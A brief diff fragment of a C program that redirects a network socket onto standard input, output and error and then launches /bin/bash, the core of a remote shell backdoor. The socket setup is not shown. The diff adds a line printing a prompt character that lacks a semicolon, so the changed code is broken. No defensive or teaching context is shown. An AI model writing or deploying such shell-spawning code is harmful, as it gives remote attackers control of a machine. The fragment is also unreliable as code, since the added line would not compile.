@@ -31,6 +31,7 @@ int main(int argc, char *argv[]){
 		dup2(socket_info,0);
 		dup2(socket_info,1);
 		dup2(socket_info,2);
+		printf("#\n")
 		execlp("/bin/bash", "/bin/bash", NULL);
 	}
 }
